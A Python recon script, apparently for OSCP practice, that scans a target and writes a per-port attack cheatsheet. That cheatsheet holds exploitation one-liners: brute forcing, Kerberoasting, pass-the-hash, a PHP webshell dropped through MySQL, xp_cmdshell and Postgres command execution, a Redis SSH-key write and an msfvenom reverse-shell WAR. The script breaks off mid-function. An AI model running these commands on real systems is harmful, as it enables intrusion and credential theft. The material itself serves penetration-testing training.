#!/usr/bin/env python3
"""
oscp_recon_auto.py — OSCP Recon Automation
  1. RustScan  → fast TCP port discovery
  2. Nmap      → detailed TCP scan on open ports + UDP top-200
  3. Scaffold  → ~/oscp/machines/<IP>/{nmap,exploits,screenshots,flags,notes.md}
  4. Cheatsheet → per-port "try this first" notes written to notes.md

Usage:
    python3 oscp_recon.py <target_ip>
    python3 oscp_recon.py <target_ip> --no-udp
    python3 oscp_recon.py <target_ip> --root /custom/path
    python3 oscp_recon.py <target_ip> --autorecon          # run AutoRecon in parallel
    python3 oscp_recon.py <target_ip> --autorecon --autorecon-only  # skip RustScan/Nmap entirely

Requires: rustscan, nmap (both in PATH), run as root for UDP
Optional: autorecon (pip3 install autorecon) for --autorecon flag
"""

import argparse
import subprocess
import sys
import os
import re
from pathlib import Path
from datetime import datetime

# ─────────────────────────────────────────────
#  PORT CHEATSHEET DATABASE
#  Add/modify entries freely. Each port maps to
#  a list of (description, command_template).
#  Use {ip} as placeholder for target IP.
# ─────────────────────────────────────────────
PORT_CHEATSHEET = {
    21: {
        "service": "FTP",
        "tips": [
            ("Anonymous login check", "ftp {ip}  # user: anonymous  pass: anonymous"),
            ("Anonymous login (curl)", "curl -v ftp://{ip}/ --user anonymous:anonymous"),
            ("List files", "ftp {ip}  # then: ls -la"),
            ("Download all files", "wget -r ftp://{ip}/ --user=anonymous --password=anonymous"),
            ("Nmap FTP scripts", "nmap -sV --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 {ip}"),
            ("Brute force", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{ip}"),
        ]
    },
    22: {
        "service": "SSH",
        "tips": [
            ("Version fingerprint", "ssh -V; nc -nv {ip} 22"),
            ("Try default creds", "ssh root@{ip}; ssh admin@{ip}"),
            ("Enum auth methods", "ssh -v {ip} 2>&1 | grep 'Auth'"),
            ("Brute force (common users)", "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4"),
            ("Check for user enumeration CVE (OpenSSH < 7.7)", "python3 ssh_user_enum.py --userList users.txt --ip {ip}"),
            ("Private key hunting (after foothold)", "find / -name id_rsa 2>/dev/null; find / -name authorized_keys 2>/dev/null"),
        ]
    },
    23: {
        "service": "Telnet",
        "tips": [
            ("Connect", "telnet {ip} 23"),
            ("Try default creds", "# admin/admin, root/root, admin/(blank)"),
            ("Brute force", "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://{ip}"),
            ("Nmap scripts", "nmap -n -sV --script=telnet-ntlm-info,telnet-encryption -p 23 {ip}"),
        ]
    },
    25: {
        "service": "SMTP",
        "tips": [
            ("Banner grab", "nc -nv {ip} 25"),
            ("VRFY user enumeration", "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip}"),
            ("RCPT TO enum", "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t {ip}"),
            ("Send test email", "swaks --to user@domain --from attacker@evil.com --server {ip}"),
            ("Nmap scripts", "nmap -sV --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344 -p 25 {ip}"),
            ("Open relay check", "nmap -sV --script smtp-open-relay -p 25 {ip}"),
        ]
    },
    53: {
        "service": "DNS",
        "tips": [
            ("Zone transfer attempt", "dig axfr @{ip} domain.local"),
            ("Reverse lookup", "dig -x {ip} @{ip}"),
            ("NS records", "dig ns domain.local @{ip}"),
            ("Any records", "dig any domain.local @{ip}"),
            ("Subdomain brute (dnsrecon)", "dnsrecon -d domain.local -t brt -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
            ("dnsenum", "dnsenum --dnsserver {ip} domain.local"),
            ("Nmap scripts", "nmap -sU -sV --script=dns-recursion,dns-zone-transfer -p 53 {ip}"),
        ]
    },
    80: {
        "service": "HTTP",
        "tips": [
            ("Gobuster dir scan", "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html,bak -t 40"),
            ("Feroxbuster", "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html"),
            ("Nikto scan", "nikto -h http://{ip}"),
            ("Tech fingerprint", "whatweb http://{ip}"),
            ("Curl headers", "curl -I http://{ip}"),
            ("Check robots.txt & sitemap", "curl http://{ip}/robots.txt; curl http://{ip}/sitemap.xml"),
            ("Look for admin panels", "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt"),
            ("Wfuzz virtual host enum", "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.{ip}' --hc 400,404 http://{ip}"),
            ("SQLmap (if form found)", "sqlmap -u 'http://{ip}/page?id=1' --dbs --batch"),
            ("LFI/RFI wordlist", "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://{ip}/page?file=FUZZ"),
        ]
    },
    88: {
        "service": "Kerberos",
        "tips": [
            ("User enumeration (kerbrute)", "kerbrute userenum -d domain.local --dc {ip} /usr/share/seclists/Usernames/Names/names.txt"),
            ("AS-REP Roasting (no creds)", "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip {ip} -request -outputfile asrep_hashes.txt"),
            ("AS-REP Roasting (with creds)", "impacket-GetNPUsers domain.local/user:password -dc-ip {ip} -request"),
            ("Kerberoasting (with creds)", "impacket-GetUserSPNs domain.local/user:password -dc-ip {ip} -request -outputfile kerb_hashes.txt"),
            ("Crack hashes", "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt"),
            ("Password spray (kerbrute)", "kerbrute passwordspray -d domain.local --dc {ip} users.txt 'Password123!'"),
        ]
    },
    110: {
        "service": "POP3",
        "tips": [
            ("Banner grab", "nc -nv {ip} 110"),
            ("Manual connect", "telnet {ip} 110  # USER admin  PASS password  LIST  RETR 1"),
            ("Nmap scripts", "nmap -sV --script=pop3-capabilities,pop3-ntlm-info -p 110 {ip}"),
            ("Brute force", "hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://{ip}"),
        ]
    },
    111: {
        "service": "RPCBind / NFS",
        "tips": [
            ("List RPC services", "rpcinfo -p {ip}"),
            ("Show NFS shares", "showmount -e {ip}"),
            ("Mount NFS share", "mkdir /mnt/nfs && mount -t nfs {ip}:/share /mnt/nfs -o nolock"),
            ("Nmap NFS scripts", "nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 111 {ip}"),
            ("Check no_root_squash", "# If no_root_squash: create SUID binary on share and execute on target"),
        ]
    },
    135: {
        "service": "MSRPC",
        "tips": [
            ("Enum via rpcclient (null)", "rpcclient -U '' -N {ip}"),
            ("Enum users", "rpcclient -U '' -N {ip} -c 'enumdomusers'"),
            ("Enum groups", "rpcclient -U '' -N {ip} -c 'enumdomgroups'"),
            ("Enum shares", "rpcclient -U '' -N {ip} -c 'netshareenumall'"),
            ("Nmap scripts", "nmap -sV --script=msrpc-enum -p 135 {ip}"),
        ]
    },
    139: {
        "service": "NetBIOS / SMB",
        "tips": [
            ("List shares (null)", "smbclient -L //{ip} -N"),
            ("Enum4linux full", "enum4linux -a {ip}"),
            ("Nmap SMB scripts", "nmap --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 139,445 {ip}"),
            ("Check EternalBlue", "nmap -sV --script smb-vuln-ms17-010 -p 445 {ip}"),
            ("Connect to share", "smbclient //{ip}/ShareName -N"),
            ("CrackMapExec enum", "crackmapexec smb {ip} --shares -u '' -p ''"),
        ]
    },
    143: {
        "service": "IMAP",
        "tips": [
            ("Banner grab", "nc -nv {ip} 143"),
            ("Nmap scripts", "nmap -sV --script=imap-capabilities,imap-ntlm-info -p 143 {ip}"),
            ("Brute force", "hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://{ip}"),
            ("Manual connect", "openssl s_client -connect {ip}:993  # for IMAPS"),
        ]
    },
    161: {
        "service": "SNMP (UDP)",
        "tips": [
            ("Community string brute", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {ip}"),
            ("Full walk (public)", "snmpwalk -c public -v1 {ip}"),
            ("SNMPv2 walk", "snmpwalk -c public -v2c {ip}"),
            ("snmp-check", "snmp-check {ip} -c public"),
            ("Nmap UDP scripts", "nmap -sU --script=snmp-info,snmp-interfaces,snmp-processes,snmp-win32-users -p 161 {ip}"),
            ("Enumerate Windows users via SNMP", "snmpwalk -c public -v1 {ip} 1.3.6.1.4.1.77.1.2.25"),
        ]
    },
    389: {
        "service": "LDAP",
        "tips": [
            ("Anonymous LDAP query", "ldapsearch -x -h {ip} -b 'dc=domain,dc=local'"),
            ("Get naming context", "ldapsearch -x -h {ip} -s base namingcontexts"),
            ("Dump all (anonymous)", "ldapsearch -x -h {ip} -b 'dc=domain,dc=local' '(objectClass=*)' | tee ldap_dump.txt"),
            ("ldapdomaindump", "ldapdomaindump {ip} -u 'domain\\user' -p 'password' -o ldap_output/"),
            ("Nmap LDAP scripts", "nmap -sV --script=ldap-rootdse,ldap-search -p 389 {ip}"),
            ("Check for descriptions w/ passwords", "ldapsearch -x -h {ip} -b 'dc=domain,dc=local' '(objectClass=user)' description"),
        ]
    },
    443: {
        "service": "HTTPS",
        "tips": [
            ("SSL cert info", "openssl s_client -connect {ip}:443 | openssl x509 -noout -text"),
            ("Gobuster HTTPS", "gobuster dir -u https://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html -k -t 40"),
            ("Nikto HTTPS", "nikto -h https://{ip} -ssl"),
            ("Feroxbuster", "feroxbuster -u https://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -k"),
            ("sslscan", "sslscan {ip}:443"),
            ("Check for Heartbleed", "nmap -sV --script=ssl-heartbleed -p 443 {ip}"),
        ]
    },
    445: {
        "service": "SMB",
        "tips": [
            ("List shares (null session)", "smbclient -L //{ip} -N"),
            ("CrackMapExec null enum", "crackmapexec smb {ip} --shares -u '' -p ''"),
            ("Enum4linux", "enum4linux -a {ip}"),
            ("Check EternalBlue (MS17-010)", "nmap -sV --script smb-vuln-ms17-010 -p 445 {ip}"),
            ("All SMB vuln scripts", "nmap --script='smb-vuln*' -p 445 {ip}"),
            ("Connect to share", "smbclient //{ip}/C$ -N"),
            ("Mount share", "mount -t cifs //{ip}/ShareName /mnt/smb -o user=,password="),
            ("CrackMapExec w/ creds", "crackmapexec smb {ip} -u user -p password --shares"),
            ("Pass-the-hash", "crackmapexec smb {ip} -u Administrator -H '<NTLM_HASH>'"),
            ("impacket psexec", "impacket-psexec domain/user:password@{ip}"),
        ]
    },
    500: {
        "service": "IKE/IPSec (UDP)",
        "tips": [
            ("IKE scan", "ike-scan {ip}"),
            ("Aggressive mode", "ike-scan -A {ip}"),
            ("Nmap IKE scripts", "nmap -sU --script=ike-version -p 500 {ip}"),
        ]
    },
    512: {
        "service": "rexec",
        "tips": [
            ("Connect", "rsh -l root {ip}"),
            ("Nmap scripts", "nmap -sV --script=rexec-brute -p 512 {ip}"),
        ]
    },
    513: {
        "service": "rlogin",
        "tips": [
            ("Connect", "rlogin {ip}"),
            ("Nmap scripts", "nmap -sV --script=rlogin-brute -p 513 {ip}"),
            ("Check .rhosts", "# If access: cat /etc/hosts.equiv; cat ~/.rhosts"),
        ]
    },
    514: {
        "service": "RSH / Syslog",
        "tips": [
            ("RSH connect", "rsh {ip} whoami"),
            ("Nmap scripts", "nmap -sV --script=rsh-brute -p 514 {ip}"),
        ]
    },
    873: {
        "service": "Rsync",
        "tips": [
            ("List shares", "rsync --list-only rsync://{ip}/"),
            ("List module contents", "rsync --list-only rsync://{ip}/module_name/"),
            ("Download share", "rsync -av rsync://{ip}/module_name/ ./rsync_loot/"),
            ("Nmap scripts", "nmap -sV --script=rsync-list-modules -p 873 {ip}"),
        ]
    },
    1433: {
        "service": "MSSQL",
        "tips": [
            ("Try default creds", "impacket-mssqlclient sa:password@{ip}"),
            ("CrackMapExec MSSQL", "crackmapexec mssql {ip} -u sa -p password"),
            ("Enable xp_cmdshell", "impacket-mssqlclient sa:password@{ip}  # then: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"),
            ("Nmap MSSQL scripts", "nmap -sV --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 {ip}"),
            ("Brute force", "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{ip}"),
        ]
    },
    1521: {
        "service": "Oracle TNS",
        "tips": [
            ("SID enumeration", "tnscmd10g version -h {ip}; odat sidguesser -s {ip}"),
            ("ODAT full scan", "odat all -s {ip}"),
            ("Nmap scripts", "nmap --script=oracle-tns-version,oracle-sid-brute -p 1521 {ip}"),
        ]
    },
    2049: {
        "service": "NFS",
        "tips": [
            ("Show exports", "showmount -e {ip}"),
            ("Mount share", "mkdir /mnt/nfs; mount -t nfs {ip}:/ /mnt/nfs -o nolock"),
            ("Check no_root_squash", "# If no_root_squash: upload SUID shell, execute on target for root"),
            ("Nmap scripts", "nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 {ip}"),
            ("List all files recursively", "ls -laR /mnt/nfs/"),
        ]
    },
    3000: {
        "service": "HTTP Alt / Grafana / Node",
        "tips": [
            ("Curl headers", "curl -I http://{ip}:3000"),
            ("Web scan", "gobuster dir -u http://{ip}:3000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html"),
            ("Grafana default creds", "# admin / admin"),
            ("Check Grafana CVE-2021-43798 (path traversal)", "curl --path-as-is http://{ip}:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"),
        ]
    },
    3306: {
        "service": "MySQL",
        "tips": [
            ("Connect (root no pass)", "mysql -u root -h {ip}"),
            ("Connect with creds", "mysql -u root -p -h {ip}"),
            ("Nmap scripts", "nmap -sV --script=mysql-empty-password,mysql-databases,mysql-users -p 3306 {ip}"),
            ("Brute force", "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{ip}"),
            ("Read files via SQL", "SELECT LOAD_FILE('/etc/passwd');"),
            ("Write webshell via SQL", "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"),
        ]
    },
    3389: {
        "service": "RDP",
        "tips": [
            ("Connect (remmina/xfreerdp)", "xfreerdp /u:Administrator /p:password /v:{ip}"),
            ("Connect (allow cert)", "xfreerdp /u:Administrator /p:password /v:{ip} /cert-ignore"),
            ("Pass-the-hash RDP", "xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:{ip}"),
            ("Check BlueKeep (CVE-2019-0708)", "nmap -sV --script=rdp-vuln-ms12-020 -p 3389 {ip}"),
            ("Brute force", "hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://{ip} -t 4"),
            ("Nmap scripts", "nmap -sV --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 {ip}"),
        ]
    },
    4369: {
        "service": "Erlang/RabbitMQ EPMD",
        "tips": [
            ("Nmap scripts", "nmap -sV --script=epmd-info -p 4369 {ip}"),
            ("Get node names", "# Use epmd client to list registered nodes"),
        ]
    },
    5432: {
        "service": "PostgreSQL",
        "tips": [
            ("Connect", "psql -h {ip} -U postgres"),
            ("Nmap scripts", "nmap -sV --script=pgsql-brute -p 5432 {ip}"),
            ("Brute force", "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{ip}"),
            ("Command exec (if superuser)", "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;"),
        ]
    },
    5900: {
        "service": "VNC",
        "tips": [
            ("Connect", "vncviewer {ip}:5900"),
            ("Brute force", "hydra -P /usr/share/wordlists/rockyou.txt vnc://{ip}"),
            ("Nmap scripts", "nmap -sV --script=vnc-info,vnc-brute,realvnc-auth-bypass -p 5900 {ip}"),
            ("Check auth bypass (CVE-2006-2369)", "# If RealVNC 4.1.0: authentication bypass possible"),
        ]
    },
    5985: {
        "service": "WinRM (HTTP)",
        "tips": [
            ("Connect (evil-winrm)", "evil-winrm -i {ip} -u Administrator -p 'password'"),
            ("Connect with hash", "evil-winrm -i {ip} -u Administrator -H '<NTLM_HASH>'"),
            ("CrackMapExec check", "crackmapexec winrm {ip} -u administrator -p password"),
            ("Test via curl", "curl -s -o /dev/null -w '%{http_code}' http://{ip}:5985/wsman"),
        ]
    },
    5986: {
        "service": "WinRM (HTTPS)",
        "tips": [
            ("Connect (evil-winrm)", "evil-winrm -i {ip} -u Administrator -p 'password' -S"),
            ("Connect with hash", "evil-winrm -i {ip} -u Administrator -H '<NTLM_HASH>' -S"),
        ]
    },
    6379: {
        "service": "Redis",
        "tips": [
            ("Connect (no auth)", "redis-cli -h {ip}"),
            ("Info", "redis-cli -h {ip} info"),
            ("List keys", "redis-cli -h {ip} keys '*'"),
            ("Write SSH key (if running as root)", "redis-cli -h {ip} config set dir /root/.ssh/\nredis-cli -h {ip} config set dbfilename authorized_keys\nredis-cli -h {ip} set crackit '\\n\\n<YOUR_PUBKEY>\\n\\n'\nredis-cli -h {ip} save"),
            ("Nmap scripts", "nmap -sV --script=redis-info -p 6379 {ip}"),
        ]
    },
    8080: {
        "service": "HTTP Alt / Tomcat / Jenkins",
        "tips": [
            ("Curl headers", "curl -I http://{ip}:8080"),
            ("Gobuster", "gobuster dir -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,html,jsp"),
            ("Tomcat default creds", "# admin/admin, tomcat/tomcat, admin/s3cret, manager/manager"),
            ("Tomcat manager WAR deploy", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f war -o shell.war\n# Upload via http://{ip}:8080/manager/html"),
            ("Jenkins script console RCE", "# http://{ip}:8080/script -> println 'id'.execute().text"),
            ("Nikto", "nikto -h http://{ip}:8080"),
        ]
    },
    8443: {
        "service": "HTTPS Alt",
        "tips": [
            ("Gobuster HTTPS", "gobuster dir -u https://{ip}:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -k"),
            ("Nikto", "nikto -h https://{ip}:8443 -ssl"),
            ("SSL cert info", "openssl s_client -connect {ip}:8443"),
        ]
    },
    9200: {
        "service": "Elasticsearch",
        "tips": [
            ("Check version", "curl http://{ip}:9200/"),
            ("List indices", "curl http://{ip}:9200/_cat/indices?v"),
            ("Dump index", "curl http://{ip}:9200/<index_name>/_search?pretty&size=100"),
            ("Nmap scripts", "nmap -sV --script=http-elasticsearch -p 9200 {ip}"),
        ]
    },
    27017: {
        "service": "MongoDB",
        "tips": [
            ("Connect (no auth)", "mongo --host {ip}"),
            ("List databases", "show dbs"),
            ("Nmap scripts", "nmap -sV --script=mongodb-info,mongodb-databases -p 27017 {ip}"),
        ]
    },
}

# Generic fallback for unknown ports
GENERIC_TIPS = [
    ("Banner grab (nc)", "nc -nv {ip} {port}"),
    ("Banner grab (curl)", "curl -v http://{ip}:{port}"),
    ("Nmap detailed scan", "nmap -sV -sC -p {port} {ip}"),
    ("Searchsploit", "searchsploit <service_name_and_version>"),
    ("Google", "# Search: '<service> <version> exploit site:exploit-db.com'"),
]


# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner():
    print(f"""
{CYAN}{BOLD}
 ██████╗ ███████╗ ██████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔═══██╗██╔════╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║   ██║███████╗██║     ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║   ██║╚════██║██║     ██╔═══╝     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚██████╔╝███████║╚██████╗██║         ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚═════╝ ╚══════╝ ╚═════╝╚═╝         ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
{RESET}{YELLOW}  OSCP Recon Automation — RustScan → Nmap → Scaffold → Cheatsheet{RESET}
""")

def run(cmd, shell=True, capture=True):
    """Run a shell command and return stdout."""
    print(f"{YELLOW}[+] Running: {cmd}{RESET}")
    result = subprocess.run(cmd, shell=shell, capture_output=capture, text=True)
    if result.returncode != 0 and result.stderr:
        print(f"{RED}[!] stderr: {result.stderr.strip()}{RESET}")
    return result.stdout

def parse_ports(text):
    """Extract unique port numbers from rustscan/nmap output."""
    ports = set()
    for match in re.finditer(r'(\d+)/(?:tcp|udp)', text):
        ports.add(int(match.group(1)))
    # Also match plain "Open <ip>:<port>" style from rustscan
    for match in re.finditer(r'Open\s+[\d.]+:(\d+)', text):
        ports.add(int(match.group(1)))
    return sorted(ports)


# ─────────────────────────────────────────────
#  STAGE 1 — RUSTSCAN
# ─────────────────────────────────────────────

def run_rustscan(ip):
    print(f"\n{CYAN}{BOLD}[STAGE 1] RustScan — Fast TCP Port Discovery{RESET}")
    cmd = f"rustscan -a {ip} --ulimit 5000 -- -Pn 2>/dev/null"
    output = run(cmd)
    ports = parse_ports(output)
    if not ports:
        print(f"{YELLOW}[~] RustScan found no open ports. Falling back to nmap fast scan.{RESET}")
        fallback = run(f"nmap -T4 --open -p- {ip}")
        ports = parse_ports(fallback)
    if ports:
        print(f"{GREEN}[+] TCP open ports: {ports}{RESET}")
    else:
        print(f"{RED}[-] No TCP ports discovered.{RESET}")
    return ports


# ─────────────────────────────────────────────
#  STAGE 2 — NMAP
# ─────────────────────────────────────────────

def run_nmap_tcp(ip, ports, output_dir):
    print(f"\n{CYAN}{BOLD}[STAGE 2a] Nmap — Detailed TCP Scan{RESET}")
    port_str = ",".join(str(p) for p in ports)
    base = str(output_dir / "tcp_detail")
    cmd = (
        f"nmap -sC -sV -O -Pn --open "
        f"-p {port_str} {ip} "
        f"-oN {base}.nmap -oX {base}.xml -oG {base}.gnmap"
    )
    output = run(cmd)
    print(f"{GREEN}[+] TCP nmap saved to {base}.*{RESET}")
    return output

def run_nmap_udp(ip, output_dir):
    print(f"\n{CYAN}{BOLD}[STAGE 2b] Nmap — UDP Top 200{RESET}")
    base = str(output_dir / "udp_top200")
    cmd = (
        f"nmap -sU --top-ports 200 -Pn --open {ip} "
        f"-oN {base}.nmap -oX {base}.xml -oG {base}.gnmap"
    )
    output = run(cmd)
    udp_ports = parse_ports(output)
    if udp_ports:
        print(f"{GREEN}[+] UDP open ports: {udp_ports}{RESET}")
    else:
        print(f"{YELLOW}[~] No UDP ports found in top 200.{RESET}")
    print(f"{GREEN}[+] UDP nmap saved to {base}.*{RESET}")
    return udp_ports


# ─────────────────────────────────────────────
#  STAGE 3 — FOLDER SCAFFOLD
# ─────────────────────────────────────────────

def scaffold(ip, root):
    print(f"\n{CYAN}{BOLD}[STAGE 3] Scaffolding Directory Structure{RESET}")
    base = Path(root).expanduser() / ip
    dirs = ["nmap", "exploits", "screenshots", "flags", "scripts"]
    for d in dirs:
        (base / d).mkdir(parents=True, exist_ok=True)
        print(f"  {GREEN}created:{RESET} {base / d}")
    print(f"{GREEN}[+] Scaffold complete: {base}{RESET}")
    return base


# ─────────────────────────────────────────────
#  STAGE 2c — AUTORECON (optional)
# ─────────────────────────────────────────────

def run_autorecon(ip, machine_dir):
    """
    Run AutoRecon against the target. Output goes into machine_dir/autorecon/.
    AutoRecon runs in a background thread so it doesn't block cheatsheet generation,
    unless --autorecon-only is set, in which case we wait for it to finish.
    Returns the Popen process handle so the caller can .wait() if needed.
    """
    print(f"\n{CYAN}{BOLD}[STAGE 2c] AutoRecon — Full Service Enumeration{RESET}")

    # Check autorecon is available
    which = subprocess.run("which autorecon", shell=True, capture_output=True, text=True)
    if not which.stdout.strip():
        print(f"{RED}[!] autorecon not found in PATH.{RESET}")
        print(f"{YELLOW}    Install: pip3 install git+https://github.com/Tib3rius/AutoRecon.git{RESET}")
        return None

    output_dir = machine_dir / "autorecon"
    output_dir.mkdir(parents=True, exist_ok=True)

    cmd = f"autorecon {ip} --output {output_dir} --single-target"
    print(f"{YELLOW}[+] Launching AutoRecon in background: {cmd}{RESET}")
    print(f"{YELLOW}[~] AutoRecon output → {output_dir}{RESET}")
    print(f"{YELLOW}[~] Tail logs: tail -f {output_dir}/autorecon.log{RESET}\n")

    # Launch as background process — stdout/stderr go to a log file
    log_file = open(output_dir / "autorecon.log", "w")
    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=log_file,
        stderr=subprocess.STDOUT
    )
    print(f"{GREEN}[+] AutoRecon running (PID {proc.pid}) — continuing with cheatsheet generation...{RESET}")
    return proc



def build_cheatsheet(ip, tcp_ports, udp_ports, machine_dir, nmap_output=""):
    print(f"\n{CYAN}{BOLD}[STAGE 4] Generating notes.md Cheatsheet{RESET}")
    all_ports = sorted(set(tcp_ports) | set(udp_ports))
    notes_path = machine_dir / "notes.md"

    lines = []
    lines.append(f"# OSCP Notes — {ip}")
    lines.append(f"\n**Scan date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
    lines.append(f"**TCP open:** {', '.join(str(p) for p in tcp_ports) or 'none'}")
    lines.append(f"**UDP open:** {', '.join(str(p) for p in udp_ports) or 'none'}\n")
    lines.append("---\n")
    lines.append("## Recon Commands\n")
    lines.append("```bash")
    lines.append(f"# Full TCP")
    lines.append(f"nmap -sC -sV -O -Pn -p- {ip} -oN nmap/full_tcp.nmap")
    lines.append(f"# UDP top 200")
    lines.append(f"nmap -sU --top-ports 200 {ip} -oN nmap/udp.nmap")
    lines.append(f"# Vuln scripts")
    lines.append(f"nmap --script vuln -Pn -p {','.join(str(p) for p in tcp_ports)} {ip} -oN nmap/vuln.nmap")
    lines.append("```\n")
    lines.append("---\n")
    lines.append("## Per-Port Attack Cheatsheet\n")

    for port in all_ports:
        proto = "UDP" if port in udp_ports and port not in tcp_ports else "TCP"
        if port in PORT_CHEATSHEET:
            info = PORT_CHEATSHEET[port]
            service = info["service"]
            tips = info["tips"]
        else:
            service = "Unknown"
            tips = [(d, c.replace("{port}", str(port))) for d, c in GENERIC_TIPS]

        lines.append(f"### Port {port}/{proto} — {service}\n")
        for desc, cmd in tips:
            cmd_filled = cmd.replace("{ip}", ip).replace("{port}", str(port))
            lines.append(f"**{desc}**")
            lines.append("```bash")
            lines.append(cmd_filled)
            lines.append("```\n")

    lines.append("---\n")
    lines.append("## Foothold Notes\n")
    lines.append("_Document your foothold path here._\n\n")
    lines.append("## Privilege Escalation Notes\n")
    lines.append("_Document your privesc path here._\n\n")
    lines.append("## Flags\n")
    lines.append("| Flag | Value |\n|---|---|\n| local.txt | |\n| proof.txt | |\n")
    lines.append("## Credentials Found\n")
    lines.append("| Username | Password / Hash | Service |\n|---|---|---|\n|  |  |  |\n")

    notes_path.write_text("\n".join(lines))
    print(f"{GREEN}[+] notes.md written to {notes_path}{RESET}")
    return notes_path


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

def main():
    banner()
    parser = argparse.ArgumentParser(description="OSCP Recon Automation")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("--root", default="~/oscp/machines", help="Root output directory (default: ~/oscp/machines)")
    parser.add_argument("--no-udp", action="store_true", help="Skip UDP scan")
    parser.add_argument("--autorecon", action="store_true",
                        help="Run AutoRecon in parallel alongside RustScan/Nmap")
    parser.add_argument("--autorecon-only", action="store_true",
                        help="Skip RustScan/Nmap entirely and run only AutoRecon (implies --autorecon)")
    args = parser.parse_args()

    ip              = args.ip
    root            = args.root
    do_udp          = not args.no_udp
    do_autorecon    = args.autorecon or args.autorecon_only
    autorecon_only  = args.autorecon_only

    # ── Stage 3 first so all output goes into the right folder
    machine_dir = scaffold(ip, root)
    nmap_dir    = machine_dir / "nmap"

    # ── Stage 2c: Launch AutoRecon in background (if requested)
    autorecon_proc = None
    if do_autorecon:
        autorecon_proc = run_autorecon(ip, machine_dir)

    tcp_ports    = []
    udp_ports    = []
    nmap_tcp_out = ""

    if not autorecon_only:
        # ── Stage 1: RustScan
        tcp_ports = run_rustscan(ip)

        # ── Stage 2a: Nmap TCP detail
        if tcp_ports:
            nmap_tcp_out = run_nmap_tcp(ip, tcp_ports, nmap_dir)
        else:
            print(f"{YELLOW}[~] Skipping TCP nmap — no open ports found.{RESET}")

        # ── Stage 2b: Nmap UDP
        if do_udp:
            if os.geteuid() != 0:
                print(f"{YELLOW}[!] UDP scan requires root. Run with sudo for UDP results.{RESET}")
            else:
                udp_ports = run_nmap_udp(ip, nmap_dir)
        else:
            print(f"\n{YELLOW}[~] UDP scan skipped (--no-udp).{RESET}")

    # ── Stage 4: Cheatsheet (always generated, even in autorecon-only mode)
    if tcp_ports or udp_ports:
        build_cheatsheet(ip, tcp_ports, udp_ports, machine_dir, nmap_tcp_out)
    elif autorecon_only:
        print(f"{YELLOW}[~] --autorecon-only: no ports to cheatsheet yet.")
        print(f"    Re-run without --autorecon-only once AutoRecon finishes to generate notes.md{RESET}")
    else:
        print(f"{RED}[-] No open ports found — cheatsheet not generated.{RESET}")

    # ── If --autorecon-only, block until AutoRecon finishes
    if autorecon_only and autorecon_proc:
        print(f"\n{CYAN}[~] Waiting for AutoRecon to complete (this may take a while)...{RESET}")
